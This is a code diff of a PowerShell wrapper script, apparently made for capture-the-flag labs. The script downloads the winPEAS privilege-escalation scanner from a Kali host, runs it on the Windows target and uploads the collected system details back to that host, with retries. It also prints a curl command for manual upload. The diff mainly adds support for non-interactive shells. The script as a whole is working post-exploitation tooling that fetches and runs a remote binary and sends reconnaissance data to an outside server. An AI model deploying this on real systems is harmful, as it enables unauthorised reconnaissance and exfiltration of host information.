@@ -1,30 +1,58 @@
 # ParsingPeas Wrapper Script (PowerShell)
 # Runs winpeas and automatically sends output to Kali host
 # NOTE: Downloads scripts from Kali host (for isolated CTF environments)
-# Compatible with PowerShell 2.0+
+# Compatible with PowerShell 2.0+ and non-interactive shells
 
 # Server URL will be replaced by receiver.py
 $ServerUrl = "KALI_SERVER_URL"
 
 $ErrorActionPreference = "Stop"
 
+# Detect if running in interactive console
+$IsInteractive = $true
+try {
+    $ConsoleHost = [Console]::WindowHeight
+    if ($ConsoleHost -eq 0) { $IsInteractive = $false }
+} catch {
+    $IsInteractive = $false
+}
+
+# Output function that works in both interactive and non-interactive shells
+function Write-Output-Safe {
+    param([string]$Message)
+    if ($IsInteractive) {
+        Write-Host $Message
+    } else {
+        Write-Output $Message
+    }
+}
+
+function Write-Output-Color {
+    param([string]$Message, [string]$Color = "White")
+    if ($IsInteractive) {
+        Write-Host $Message -ForegroundColor $Color
+    } else {
+        Write-Output $Message
+    }
+}
+
 $SessionId = "scan_$(Get-Date -Format 'yyyyMMdd_HHmmss')_$PID"
 $Hostname = $env:COMPUTERNAME
 if (-not $Hostname) { $Hostname = "unknown" }
 $TmpOutput = "$env:TEMP\.winpeas_$(Get-Date -Format 'yyyyMMdd_HHmmss').tmp"
 
-Write-Host "[*] ParsingPeas - Automated Privilege Escalation Scanner" -ForegroundColor Cyan
-Write-Host "[*] Session ID: $SessionId" -ForegroundColor Cyan
-Write-Host "[*] Hostname: $Hostname" -ForegroundColor Cyan
-Write-Host "[*] Server: $ServerUrl" -ForegroundColor Cyan
-Write-Host ""
+Write-Output-Color "[*] ParsingPeas - Automated Privilege Escalation Scanner" "Cyan"
+Write-Output-Color "[*] Session ID: $SessionId" "Cyan"
+Write-Output-Color "[*] Hostname: $Hostname" "Cyan"
+Write-Output-Color "[*] Server: $ServerUrl" "Cyan"
+Write-Output-Safe ""
 
 $ScanType = "winpeas"
-Write-Host "[*] Detected: Windows system" -ForegroundColor Yellow
+Write-Output-Color "[*] Detected: Windows system" "Yellow"
 $ScriptEndpoint = "$ServerUrl/get-winpeas"
 $ScriptPath = "$env:TEMP\winpeas.exe"
 
-Write-Host "[*] Downloading $ScanType from Kali host..." -ForegroundColor Yellow
+Write-Output-Color "[*] Downloading $ScanType from Kali host..." "Yellow"
 
 # Download script from Kali host using WebClient (PowerShell 2.0+ compatible)
 try {
@@ -32,22 +60,22 @@ try {
     $WebClient.DownloadFile($ScriptEndpoint, $ScriptPath)
     $WebClient.Dispose()
 } catch {
-    Write-Host "[!] Download failed: $_" -ForegroundColor Red
+    Write-Output-Color "[!] Download failed: $_" "Red"
     exit 1
 }
 
 if (-not (Test-Path $ScriptPath) -or (Get-Item $ScriptPath).Length -eq 0) {
-    Write-Host "[!] Error: Script download failed or empty" -ForegroundColor Red
+    Write-Output-Color "[!] Error: Script download failed or empty" "Red"
     exit 1
 }
 
-Write-Host "[+] Downloaded successfully" -ForegroundColor Green
+Write-Output-Color "[+] Downloaded successfully" "Green"
 
-Write-Host "[*] Running winpeas (this may take 2-5 minutes)..." -ForegroundColor Yellow
-Write-Host "[*] Output is being saved to file..." -ForegroundColor Yellow
-Write-Host ""
+Write-Output-Color "[*] Running winpeas (this may take 2-5 minutes)..." "Yellow"
+Write-Output-Color "[*] Output is being saved to file..." "Yellow"
+Write-Output-Safe ""
 
-# Run winpeas and capture output with progress
+# Run winpeas and capture output
 try {
     $ProcessInfo = New-Object System.Diagnostics.ProcessStartInfo
     $ProcessInfo.FileName = $ScriptPath
@@ -60,7 +88,7 @@ try {
     $Process.StartInfo = $ProcessInfo
     
     $Process.Start() | Out-Null
-    Write-Host "[*] Winpeas running (PID: $($Process.Id))..." -ForegroundColor Yellow
+    Write-Output-Color "[*] Winpeas running (PID: $($Process.Id))..." "Yellow"
     
     # Start async reading to prevent buffer deadlock
     $OutputBuilder = New-Object System.Text.StringBuilder
@@ -87,17 +115,27 @@ try {
     
     # Show progress while winpeas is running
     $StartTime = Get-Date
+    $LastUpdate = $StartTime
+    
     while (-not $Process.HasExited) {
-        $Elapsed = [Math]::Round(((Get-Date) - $StartTime).TotalSeconds)
-        $Minutes = [Math]::Floor($Elapsed / 60)
-        $Seconds = $Elapsed % 60
+        $Now = Get-Date
+        $Elapsed = [Math]::Round(($Now - $StartTime).TotalSeconds)
         
-        # Estimate progress (winpeas typically takes 1-3 minutes)
-        $EstimatedDuration = 120  # seconds
-        $ProgressPercent = [Math]::Min(95, [int](($Elapsed / $EstimatedDuration) * 100))
-        
-        $ProgressBar = "[" + ("=" * [int]($ProgressPercent / 5)) + (" " * (20 - [int]($ProgressPercent / 5))) + "]"
-        Write-Host "`r[*] Progress: $ProgressBar $ProgressPercent% | Elapsed: $Minutes`:$($Seconds.ToString('00'))" -NoNewline -ForegroundColor Cyan
+        # In non-interactive mode, show periodic updates instead of progress bar
+        if (-not $IsInteractive) {
+            if (($Now - $LastUpdate).TotalSeconds -ge 10) {
+                Write-Output "[*] Still running... ($Elapsed seconds elapsed)"
+                $LastUpdate = $Now
+            }
+        } else {
+            # Interactive mode: show progress bar
+            $Minutes = [Math]::Floor($Elapsed / 60)
+            $Seconds = $Elapsed % 60
+            $EstimatedDuration = 120
+            $ProgressPercent = [Math]::Min(95, [int](($Elapsed / $EstimatedDuration) * 100))
+            $ProgressBar = "[" + ("=" * [int]($ProgressPercent / 5)) + (" " * (20 - [int]($ProgressPercent / 5))) + "]"
+            Write-Host "`r[*] Progress: $ProgressBar $ProgressPercent% | Elapsed: $Minutes`:$($Seconds.ToString('00'))" -NoNewline -ForegroundColor Cyan
+        }
         
         Start-Sleep -Milliseconds 500
     }
@@ -111,9 +149,10 @@ try {
     Remove-Job -Id $OutputEvent.Id -Force
     Remove-Job -Id $ErrorEvent.Id -Force
     
-    Write-Host "`r[+] Progress: [====================] 100% | Complete!" -NoNewline -ForegroundColor Green
-    Write-Host ""
-    Write-Host ""
+    if ($IsInteractive) {
+        Write-Host "`r[+] Progress: [====================] 100% | Complete!" -ForegroundColor Green
+    }
+    Write-Output-Safe ""
     
     # Combine output and errors
     $Output = $OutputBuilder.ToString()
@@ -127,45 +166,44 @@ try {
     # Save to temp file
     [System.IO.File]::WriteAllText($TmpOutput, $FullOutput)
     
-    Write-Host "[+] Winpeas completed with exit code: $ExitCode" -ForegroundColor Green
+    Write-Output-Color "[+] Winpeas completed with exit code: $ExitCode" "Green"
     
 } catch {
-    Write-Host "[!] Error running winpeas: $_" -ForegroundColor Red
-    Write-Host "[!] Exception: $($_.Exception.Message)" -ForegroundColor Red
+    Write-Output-Color "[!] Error running winpeas: $_" "Red"
+    Write-Output-Color "[!] Exception: $($_.Exception.Message)" "Red"
     exit 1
 }
 
 # Check if output was generated
 if (-not (Test-Path $TmpOutput) -or (Get-Item $TmpOutput).Length -eq 0) {
-    Write-Host "[!] Error: No output generated" -ForegroundColor Red
+    Write-Output-Color "[!] Error: No output generated" "Red"
     exit 1
 }
 
 $OutputSize = (Get-Item $TmpOutput).Length
-Write-Host "[+] Final output size: $([Math]::Round($OutputSize / 1KB, 2)) KB" -ForegroundColor Green
-Write-Host ""
+Write-Output-Color "[+] Final output size: $([Math]::Round($OutputSize / 1KB, 2)) KB" "Green"
+Write-Output-Safe ""
 
-# Skip tail display to avoid hanging with large files in PS 2.0
-Write-Host "[*] Output saved, preparing upload..." -ForegroundColor Yellow
-Write-Host ""
+# Skip tail display to avoid issues
+Write-Output-Color "[*] Output saved, preparing upload..." "Yellow"
+Write-Output-Safe ""
 
 # Test connection before upload
-Write-Host "[*] Testing connection to Kali host..." -ForegroundColor Yellow
+Write-Output-Color "[*] Testing connection to Kali host..." "Yellow"
 try {
     $TestClient = New-Object System.Net.WebClient
     $TestResponse = $TestClient.DownloadString("$ServerUrl/health")
     $TestClient.Dispose()
-    Write-Host "[+] Connection test successful" -ForegroundColor Green
+    Write-Output-Color "[+] Connection test successful" "Green"
 } catch {
-    Write-Host "[!] Warning: Cannot reach server at $ServerUrl" -ForegroundColor Yellow
-    Write-Host "[!] Error: $_" -ForegroundColor Yellow
-    Write-Host "[*] Will attempt upload anyway..." -ForegroundColor Yellow
+    Write-Output-Color "[!] Warning: Cannot reach server at $ServerUrl" "Yellow"
+    Write-Output-Color "[*] Will attempt upload anyway..." "Yellow"
 }
 
-Write-Host "[*] Transferring to Kali host..." -ForegroundColor Yellow
-Write-Host "[*] Upload endpoint: $ServerUrl/upload" -ForegroundColor Cyan
-Write-Host "[*] File to upload: $TmpOutput ($([Math]::Round($OutputSize / 1KB, 2)) KB)" -ForegroundColor Cyan
-Write-Host ""
+Write-Output-Color "[*] Transferring to Kali host..." "Yellow"
+Write-Output-Color "[*] Upload endpoint: $ServerUrl/upload" "Cyan"
+Write-Output-Color "[*] File to upload: $([Math]::Round($OutputSize / 1KB, 2)) KB" "Cyan"
+Write-Output-Safe ""
 
 # Send to Kali with retry logic
 $MaxRetries = 3
@@ -173,7 +211,7 @@ $RetryCount = 0
 $Success = $false
 
 while ($RetryCount -lt $MaxRetries -and -not $Success) {
-    Write-Host "[*] Upload attempt $($RetryCount + 1)/$MaxRetries" -ForegroundColor Yellow
+    Write-Output-Color "[*] Upload attempt $($RetryCount + 1)/$MaxRetries" "Yellow"
     
     try {
         $WebClient = New-Object System.Net.WebClient
@@ -182,24 +220,23 @@ while ($RetryCount -lt $MaxRetries -and -not $Success) {
         $WebClient.Headers.Add("X-Scan-Type", $ScanType)
         $WebClient.Headers.Add("Content-Type", "text/plain")
         
-        Write-Host "[*] Reading file bytes..." -ForegroundColor Cyan
+        Write-Output-Color "[*] Reading file bytes..." "Cyan"
         $FileBytes = [System.IO.File]::ReadAllBytes($TmpOutput)
-        Write-Host "[+] Read $($FileBytes.Length) bytes" -ForegroundColor Green
+        Write-Output-Color "[+] Read $($FileBytes.Length) bytes" "Green"
         
-        Write-Host "[*] Uploading to $ServerUrl/upload ..." -ForegroundColor Cyan
+        Write-Output-Color "[*] Uploading to $ServerUrl/upload ..." "Cyan"
         
         $ResponseBytes = $WebClient.UploadData("$ServerUrl/upload", "POST", $FileBytes)
         $ResponseText = [System.Text.Encoding]::UTF8.GetString($ResponseBytes)
         
-        Write-Host "[+] Upload complete!" -ForegroundColor Green
-        Write-Host "[+] Transfer successful!" -ForegroundColor Green
+        Write-Output-Color "[+] Upload complete!" "Green"
+        Write-Output-Color "[+] Transfer successful!" "Green"
         
         # Try to extract report URL from response
         try {
-            # Simple regex to extract report_url from JSON
             if ($ResponseText -match '"report_url"\s*:\s*"([^"]+)"') {
                 $ReportUrl = $matches[1]
-                Write-Host "[+] View report at: $ServerUrl$ReportUrl" -ForegroundColor Green
+                Write-Output-Color "[+] View report at: $ServerUrl$ReportUrl" "Green"
             }
         } catch {
             # Ignore parse errors
@@ -210,31 +247,31 @@ while ($RetryCount -lt $MaxRetries -and -not $Success) {
         
     } catch {
         $RetryCount++
-        Write-Host "[!] Transfer failed" -ForegroundColor Red
-        Write-Host "[!] Error: $_" -ForegroundColor Red
-        Write-Host "[!] Exception: $($_.Exception.Message)" -ForegroundColor Red
+        Write-Output-Color "[!] Transfer failed" "Red"
+        Write-Output-Color "[!] Error: $_" "Red"
+        Write-Output-Color "[!] Exception: $($_.Exception.Message)" "Red"
         if ($_.Exception.InnerException) {
-            Write-Host "[!] Inner Exception: $($_.Exception.InnerException.Message)" -ForegroundColor Red
+            Write-Output-Color "[!] Inner Exception: $($_.Exception.InnerException.Message)" "Red"
         }
         
         if ($RetryCount -lt $MaxRetries) {
-            Write-Host "[*] Retrying in 2 seconds..." -ForegroundColor Yellow
+            Write-Output-Color "[*] Retrying in 2 seconds..." "Yellow"
             Start-Sleep -Seconds 2
         }
     }
 }
 
-Write-Host ""
+Write-Output-Safe ""
 if ($Success) {
-    Write-Host "[+] Cleaning up..." -ForegroundColor Green
+    Write-Output-Color "[+] Cleaning up..." "Green"
     Remove-Item -Path $ScriptPath -Force -ErrorAction SilentlyContinue
     Remove-Item -Path $TmpOutput -Force -ErrorAction SilentlyContinue
-    Write-Host "[+] Done!" -ForegroundColor Green
+    Write-Output-Color "[+] Done!" "Green"
     exit 0
 } else {
-    Write-Host "[!] Transfer failed after $MaxRetries attempts" -ForegroundColor Red
-    Write-Host "[*] Output saved locally at: $TmpOutput" -ForegroundColor Yellow
-    Write-Host "[*] You can manually upload with curl:" -ForegroundColor Yellow
-    Write-Host "    curl -X POST --data-binary @'$TmpOutput' -H 'X-Hostname: $Hostname' $ServerUrl/upload" -ForegroundColor Yellow
+    Write-Output-Color "[!] Transfer failed after $MaxRetries attempts" "Red"
+    Write-Output-Color "[*] Output saved locally at: $TmpOutput" "Yellow"
+    Write-Output-Color "[*] You can manually upload with curl:" "Yellow"
+    Write-Output-Color "    curl -X POST --data-binary @'$TmpOutput' -H 'X-Hostname: $Hostname' $ServerUrl/upload" "Yellow"
     exit 1
 }
